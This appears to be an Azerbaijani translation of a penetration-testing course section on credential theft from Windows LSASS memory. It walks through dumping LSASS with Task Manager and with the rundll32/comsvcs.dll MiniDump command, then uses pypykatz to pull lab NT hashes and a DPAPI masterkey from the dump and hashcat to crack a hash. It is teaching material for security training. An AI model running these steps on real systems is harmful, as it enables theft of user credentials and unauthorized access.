## LSASS-a Hücum

Şifrə heşlərini çıxarmaq və sındırmaq üçün SAM verilənlər bazasının kopyalarını əldə etməklə yanaşı, biz həm də **Yerli Təhlükəsizlik Orqanının Alt Sistem Xidmətini (LSASS)** hədəf almaqdan faydalanacağıq. Bu modulun Etimadnamə Saxlanması bölməsində qeyd edildiyi kimi, LSASS təhlükəsizlik siyasətlərinin tətbiqi, istifadəçi autentifikasiyasının idarə edilməsi və həssas etimadnamə materiallarının yaddaşda saxlanması üçün məsuliyyət daşıyan əsas bir Windows prosesidir.

<img width="2048" height="1148" alt="image" src="https://github.com/user-attachments/assets/36bf8779-9edd-49b7-a5c9-b1267d25ad80" />

İlkin loqin zamanı LSASS:

  * Etimadnamələri yerli olaraq yaddaşda keşləyir
  * Giriş *token*-ləri yaradır
  * Təhlükəsizlik siyasətlərini tətbiq edir
  * Windows-un təhlükəsizlik jurnalına yazır

Gəlin, Windows işləyən bir hədəfdən LSASS yaddaşını *dump* etmək və etimadnamələri çıxarmaq üçün istifadə edə biləcəyimiz bəzi üsulları və alətləri nəzərdən keçirək.

### LSASS Proses Yaddaşının *Dump* Edilməsi

SAM verilənlər bazasına hücum prosesinə bənzər şəkildə, əvvəlcə yaddaş *dump* faylı yaratmaqla LSASS proses yaddaşının tərkibinin kopyasını yaratmaq ağlabatan olar. *Dump* faylı yaratmaq bizə hücumçu hostumuzdan oflayn rejimdə etimadnamələri çıxarmağa imkan verir. Unutmayın ki, hücumları oflayn həyata keçirmək bizə hücumun sürətində daha çox çeviklik verir və hədəf sistemdə daha az vaxt keçirməyi tələb edir. Yaddaş *dump* faylı yaratmaq üçün saysız-hesabsız üsullar mövcuddur, buna görə də gəlin Windows-a artıq daxil edilmiş alətlərdən istifadə edilərək həyata keçirilə bilən texnikaları nəzərdən keçirək.

#### Task Manager Metodu

Hədəfdə interaktiv qrafik seansa girişlə, yaddaş *dump* faylı yaratmaq üçün **Task Manager**-dən istifadə edə bilərik. Bu, aşağıdakıları tələb edir:

1.  Task Manager-i açmaq
2.  **Processes** (Proseslər) tabını seçmək
3.  **Local Security Authority Process** (Yerli Təhlükəsizlik Orqanı Prosesi) tapıb üzərinə sağ klik etmək
4.  **Create dump file** (*Dump* faylı yarat) seçmək

<img width="1024" height="738" alt="image" src="https://github.com/user-attachments/assets/c16e72ed-7044-4a3a-aef3-db0c60868e3a" />

**lsass.DMP** adlı bir fayl yaradılır və **`%temp%`** qovluğunda saxlanılır. Bu, hücumçu hostumuza köçürəcəyimiz fayldır. *Dump* faylını hücumçu hostumuza köçürmək üçün bu modulun əvvəlki hissəsində müzakirə olunan fayl ötürmə üsulundan istifadə edə bilərik.

#### Rundll32.exe & Comsvcs.dll Metodu

Task Manager metodu hədəflə **GUI əsaslı interaktiv seansa** sahib olmağımızdan asılıdır. **`rundll32.exe`** adlı əmr sətri utiliti vasitəsilə LSASS proses yaddaşını *dump* etmək üçün alternativ bir üsuldan istifadə edə bilərik. Bu yol Task Manager metodundan daha sürətlidir və daha çevikdir, çünki Windows hostunda yalnız əmr sətrinə girişlə bir *shell* seansı əldə edə bilərik. Qeyd etmək vacibdir ki, müasir anti-virus alətləri bu metodu zərərli fəaliyyət kimi tanıyır.

*Dump* faylını yaratmaq üçün əmri verməzdən əvvəl, **`lsass.exe`**-yə təyin olunmuş **proses ID-sini (PID)** müəyyən etməliyik. Bu, **cmd** və ya **PowerShell**-dən edilə bilər:

**Cmd-də LSASS-ın PID-ni Tapmaq**
Cmd-dən, **`tasklist /svc`** əmrini verərək **`lsass.exe`**-ni və onun proses ID-ni tapa bilərik.

```
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

**PowerShell-də LSASS-ın PID-ni Tapmaq**
PowerShell-dən, **`Get-Process lsass`** əmrini verə bilərik və proses ID-ni **Id** sahəsində görə bilərik.

```
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

LSASS prosesinə təyin olunmuş PID-ni əldə etdikdən sonra, bir *dump* faylı yarada bilərik.

**PowerShell İstifadə Edərək *Dump* Faylı Yaratmaq**
Yüksək imtiyazlı PowerShell seansı ilə, *dump* faylı yaratmaq üçün aşağıdakı əmri verə bilərik:

```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Bu əmrlə, biz **`rundll32.exe`**-ni işə salırıq ki, **`comsvcs.dll`**-in ixrac edilmiş funksiyasını çağırsın, bu da **`MiniDumpWriteDump`** (`MiniDump`) funksiyasını çağıraraq LSASS proses yaddaşını müəyyən edilmiş qovluğa (**`C:\lsass.dmp`**) *dump* etsin. Xatırlayın ki, əksər müasir AV alətləri bunu zərərli fəaliyyət kimi tanıyır və əmrin icrasına mane olur. Belə hallarda, qarşılaşdığımız AV alətini yan keçmək və ya söndürmək yollarını nəzərdən keçirməliyik. AV-ni yan keçmə texnikaları bu modulun əhatə dairəsindən kənardır.

Əgər bu əmri işə salmağı və **`lsass.dmp`** faylını yaratmağı bacarsaq, LSASS proses yaddaşında saxlanıla biləcək hər hansı bir etimadnaməni çıxarmağa cəhd etmək üçün faylı hücumçu qutumuza köçürməyə davam edə bilərik.

**Qeyd:** `lsass.dmp` faylını hədəfdən hücumçu hostumuza almaq üçün SAM-a Hücum bölməsində müzakirə olunan fayl ötürmə metodundan istifadə edə bilərik.

### Etimadnamələri Çıxarmaq üçün Pypykatz İstifadəsi

*Dump* faylı hücumçu hostumuzda olduqdan sonra, **`.dmp`** faylından etimadnamələri çıxarmaq üçün **pypykatz** adlı güclü bir alətdən istifadə edə bilərik. **Pypykatz** tamamilə Python-da yazılmış **Mimikatz**-ın bir tətbiqidir. Python-da yazılmış olması bizə onu Linux əsaslı hücumçu hostlarında işlətməyə imkan verir. Yazıldığı vaxtda, Mimikatz yalnız Windows sistemlərində işləyir, buna görə də onu istifadə etmək üçün ya Windows hücumçu hostuna ehtiyacımız olacaq, ya da Mimikatz-ı birbaşa hədəfdə işlətməyə ehtiyacımız olacaq ki, bu da ideal bir ssenari deyil. Bu, **Pypykatz**-ı cəlbedici bir alternativ edir, çünki bizə lazım olan tək şey *dump* faylının kopyasıdır və biz onu Linux əsaslı hücumçu hostumuzdan oflayn rejimdə işlədə bilərik.

Xatırlayın ki, LSASS Windows sistemlərində **aktiv loqin seanslarına** aid etimadnamələri saxlayır. LSASS proses yaddaşını fayla *dump* etdiyimiz zaman, əslində o anda yaddaşda olanların "anlıq şəklini" çəkmiş olduq. Əgər hər hansı bir aktiv loqin seansı varsa, onları yaratmaq üçün istifadə olunan etimadnamələr orada olacaq. Gəlin, *dump* faylına qarşı Pypykatz-ı işə salaq və nəticələri öyrənək.

#### Pypykatz-ı İşə Salmaq

Əmr, LSASS proses yaddaşı *dump*-ında gizlənmiş sirləri *parse* etmək üçün **pypykatz**-ın istifadəsini başladır. Əmrdə **`lsa`** istifadə edirik, çünki LSASS Yerli Təhlükəsizlik Orqanının bir alt sistemidir, sonra məlumat mənbəyini **`minidump`** faylı kimi göstəririk, ardınca isə hücumçu hostumuzda saxlanılan *dump* faylının yolu gəlir. Pypykatz *dump* faylını *parse* edir və tapıntıları çıxarır:

```
nijatmansimov@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Gəlin, çıxışdakı bəzi faydalı məlumatlara daha ətraflı nəzər salaq.

#### MSV

```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

**MSV** Windows-da LSA-nın SAM verilənlər bazasına qarşı loqin cəhdlərini təsdiqləmək üçün çağırdığı bir autentifikasiya paketidir. Pypykatz **`bob`** istifadəçi hesabının LSASS proses yaddaşında saxlanılan loqin seansı ilə əlaqəli **SID**, **İstifadəçi adı**, **Domen**, hətta **NT** və **SHA1** şifrə heşlərini çıxarıb. Bu, hissənin sonunda nəzərdən keçirilən hücumumuzun növbəti addımında faydalı olacaq.

#### WDIGEST

```
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

**WDIGEST** Windows XP - Windows 8 və Windows Server 2003 - Windows Server 2012-də defolt olaraq aktivləşdirilmiş daha köhnə bir autentifikasiya protokoludur. LSASS WDIGEST tərəfindən istifadə olunan etimadnamələri **aydın mətndə** (clear-text) keşləyir. Bu o deməkdir ki, WDIGEST aktivləşdirilmiş bir Windows sistemini hədəf alsaq, böyük ehtimalla **aydın mətndə şifrə** görəcəyik. Müasir Windows əməliyyat sistemlərində WDIGEST defolt olaraq söndürülmüşdür. Əlavə olaraq, qeyd etmək vacibdir ki, Microsoft WDIGEST ilə əlaqəli bu problemdən təsirlənən sistemlər üçün bir təhlükəsizlik yenilənməsi yayımladı. Biz bu təhlükəsizlik yenilənməsinin təfərrüatlarını burada öyrənə bilərik.

#### Kerberos

```
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

**Kerberos** Windows Domen mühitlərində **Active Directory** tərəfindən istifadə olunan bir şəbəkə autentifikasiya protokoludur. Domen istifadəçi hesablarına Active Directory ilə autentifikasiya edildikdən sonra *biletlər* verilir. Bu bilet istifadəçinin hər dəfə öz etimadnamələrini daxil etmədən, giriş icazəsi verilmiş şəbəkədəki paylaşılan resurslara daxil olmasına imkan vermək üçün istifadə olunur. LSASS **Kerberos** ilə əlaqəli şifrələri, e-açarları (*ekeys*), biletləri və pinləri keşləyir. Onları LSASS proses yaddaşından çıxarmaq və eyni domenə qoşulmuş digər sistemlərə daxil olmaq üçün istifadə etmək mümkündür.

#### DPAPI

```
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz və Pypykatz, məlumatları LSASS proses yaddaşında mövcud olan loqin olmuş istifadəçilər üçün **DPAPI masterkey-ni** çıxara bilər. Bu *masterkey*-lər daha sonra DPAPI istifadə edən hər bir tətbiqlə əlaqəli sirləri deşifrə etmək üçün istifadə edilə bilər və nəticədə müxtəlif hesablar üçün etimadnamələrin ələ keçirilməsi ilə nəticələnir. DPAPI hücum texnikaları Windows İmtiyazların Yüksəldilməsi modulunda daha ətraflı əhatə olunur.

### Hashcat ilə NT Heşini Sındırmaq

NT Heşini sındırmaq üçün **Hashcat**-dən istifadə edə bilərik. Bu nümunədə, biz yalnız Bob istifadəçisi ilə əlaqəli bir NT heşi tapdıq. Əmrdə modu təyin etdikdən sonra, heşi yapışdıra, bir söz siyahısı göstərə və sonra heşi sındıra bilərik.

```
nijatmansimov@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```
